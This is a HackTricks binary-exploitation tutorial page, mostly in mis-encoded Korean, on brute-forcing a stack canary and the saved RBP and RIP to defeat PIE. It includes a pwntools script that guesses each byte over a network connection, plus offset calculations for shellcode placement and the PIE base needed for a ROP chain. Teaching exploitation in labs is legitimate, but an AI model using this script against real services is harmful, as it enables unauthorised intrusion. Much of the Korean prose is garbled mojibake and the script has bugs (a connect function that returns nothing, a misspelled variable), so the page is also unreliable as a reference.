# BF Addresses in the Stack

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**ë§Œì•½ ë‹¹ì‹ ì´ canaryì™€ PIE(ìœ„ì¹˜ ë…ë¦½ ì‹¤í–‰ íŒŒì¼)ë¡œ ë³´í˜¸ëœ ë°”ì´ë„ˆë¦¬ë¥¼ ë§ˆì£¼í•˜ê³  ìˆë‹¤ë©´, ì´ë¥¼ ìš°íšŒí•  ë°©ë²•ì„ ì°¾ì•„ì•¼ í•  ê²ƒì…ë‹ˆë‹¤.**

![](<../../../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
**`checksec`**ëŠ” ë°”ì´ë„ˆë¦¬ê°€ canaryë¡œ ë³´í˜¸ë˜ê³  ìˆëŠ”ì§€ ì°¾ì§€ ëª»í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ì •ì ìœ¼ë¡œ ì»´íŒŒì¼ë˜ì—ˆê³  í•¨ìˆ˜ë¥¼ ì‹ë³„í•  ìˆ˜ ì—†ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.\
ê·¸ëŸ¬ë‚˜ í•¨ìˆ˜ í˜¸ì¶œì˜ ì‹œì‘ ë¶€ë¶„ì—ì„œ ìŠ¤íƒì— ê°’ì´ ì €ì¥ë˜ê³  ì´ ê°’ì´ ì¢…ë£Œ ì „ì— í™•ì¸ë˜ëŠ” ê²ƒì„ ë°œê²¬í•˜ë©´ ìˆ˜ë™ìœ¼ë¡œ ì´ë¥¼ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

## Brute-Force Addresses

PIEë¥¼ ìš°íšŒí•˜ê¸° ìœ„í•´ì„œëŠ” **ì£¼ì†Œë¥¼ ìœ ì¶œí•´ì•¼** í•©ë‹ˆë‹¤. ë§Œì•½ ë°”ì´ë„ˆë¦¬ê°€ ì–´ë–¤ ì£¼ì†Œë„ ìœ ì¶œí•˜ì§€ ì•ŠëŠ”ë‹¤ë©´, ê°€ì¥ ì¢‹ì€ ë°©ë²•ì€ **ì·¨ì•½í•œ í•¨ìˆ˜ì—ì„œ ìŠ¤íƒì— ì €ì¥ëœ RBPì™€ RIPë¥¼ ë¬´ì‘ìœ„ë¡œ ì¶”ì¸¡í•˜ëŠ” ê²ƒ**ì…ë‹ˆë‹¤.\
ì˜ˆë¥¼ ë“¤ì–´, ë°”ì´ë„ˆë¦¬ê°€ **canary**ì™€ **PIE**ë¡œ ë³´í˜¸ë˜ê³  ìˆë‹¤ë©´, ë¨¼ì € canaryë¥¼ ë¬´ì‘ìœ„ë¡œ ì¶”ì¸¡í•œ ë‹¤ìŒ, **ë‹¤ìŒ** 8 ë°”ì´íŠ¸(x64)ëŠ” ì €ì¥ëœ **RBP**ê°€ ë˜ê³ , **ë‹¤ìŒ** 8 ë°”ì´íŠ¸ëŠ” ì €ì¥ëœ **RIP**ê°€ ë©ë‹ˆë‹¤.

{% hint style="success" %}
ìŠ¤íƒ ë‚´ì˜ ë°˜í™˜ ì£¼ì†ŒëŠ” ì£¼ ë°”ì´ë„ˆë¦¬ ì½”ë“œì— ì†í•˜ëŠ” ê²ƒìœ¼ë¡œ ê°€ì •ë˜ë©°, ì·¨ì•½ì ì´ ë°”ì´ë„ˆë¦¬ ì½”ë“œì— ìœ„ì¹˜í•œë‹¤ë©´ ì¼ë°˜ì ìœ¼ë¡œ ê·¸ë ‡ìŠµë‹ˆë‹¤.
{% endhint %}

ë°”ì´ë„ˆë¦¬ì—ì„œ RBPì™€ RIPë¥¼ ë¬´ì‘ìœ„ë¡œ ì¶”ì¸¡í•˜ê¸° ìœ„í•´ì„œëŠ” í”„ë¡œê·¸ë¨ì´ ë¬´ì–¸ê°€ë¥¼ ì¶œë ¥í•˜ê±°ë‚˜ ë‹¨ìˆœíˆ ì¶©ëŒí•˜ì§€ ì•ŠëŠ” ê²½ìš° ìœ íš¨í•œ ì¶”ì¸¡ ë°”ì´íŠ¸ê°€ ì˜¬ë°”ë¥´ë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. **canaryë¥¼ ë¬´ì‘ìœ„ë¡œ ì¶”ì¸¡í•˜ëŠ” ë° ì œê³µëœ ê²ƒê³¼ ë™ì¼í•œ í•¨ìˆ˜**ë¥¼ ì‚¬ìš©í•˜ì—¬ RBPì™€ RIPë¥¼ ë¬´ì‘ìœ„ë¡œ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
PIEë¥¼ ë¬´ë„ˆëœ¨ë¦¬ê¸° ìœ„í•´ í•„ìš”í•œ ë§ˆì§€ë§‰ ê²ƒì€ **ìœ ì¶œëœ** ì£¼ì†Œì—ì„œ **ìœ ìš©í•œ ì£¼ì†Œë¥¼ ê³„ì‚°í•˜ëŠ” ê²ƒ**ì…ë‹ˆë‹¤: **RBP**ì™€ **RIP**ì…ë‹ˆë‹¤.

**RBP**ì—ì„œ ìŠ¤íƒì— **ì‰˜ì„ ì–´ë””ì— ì“°ê³  ìˆëŠ”ì§€** ê³„ì‚°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ìŠ¤íƒ ë‚´ì—ì„œ ë¬¸ìì—´ _"/bin/sh\x00"_ì„ ì–´ë””ì— ì“¸ ê²ƒì¸ì§€ ì•„ëŠ” ë° ë§¤ìš° ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìœ ì¶œëœ RBPì™€ ì‰˜ì½”ë“œ ê°„ì˜ ê±°ë¦¬ë¥¼ ê³„ì‚°í•˜ë ¤ë©´ **RBPë¥¼ ìœ ì¶œí•œ í›„ì— ë¸Œë ˆì´í¬í¬ì¸íŠ¸ë¥¼ ì„¤ì •í•˜ê³ ** **ì‰˜ì½”ë“œê°€ ì–´ë””ì— ìœ„ì¹˜í•˜ëŠ”ì§€** í™•ì¸í•œ ë‹¤ìŒ, ì‰˜ì½”ë“œì™€ RBP ê°„ì˜ ê±°ë¦¬ë¥¼ ê³„ì‚°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
INI_SHELLCODE = RBP - 1152
```
From the **RIP** you can calculate the **base address of the PIE binary** which is what you are going to need to create a **valid ROP chain**.\
To calculate the base address just do `objdump -d vunbinary` and check the disassemble latest addresses:

![](<../../../../.gitbook/assets/image (145).png>)

ì´ ì˜ˆì œì—ì„œëŠ” ëª¨ë“  ì½”ë“œë¥¼ ì°¾ê¸° ìœ„í•´ **1ë°”ì´íŠ¸ ë°˜**ë§Œ í•„ìš”í•˜ë‹¤ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì´ ìƒí™©ì—ì„œ ê¸°ë³¸ ì£¼ì†ŒëŠ” **ìœ ì¶œëœ RIPì´ì§€ë§Œ "000"ìœ¼ë¡œ ëë‚˜ëŠ”** ê²ƒì…ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, `0x562002970ecf`ê°€ ìœ ì¶œë˜ì—ˆë‹¤ë©´ ê¸°ë³¸ ì£¼ì†ŒëŠ” `0x562002970000`ì…ë‹ˆë‹¤.
```python
elf.address = RIP - (RIP & 0xfff)
```
{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
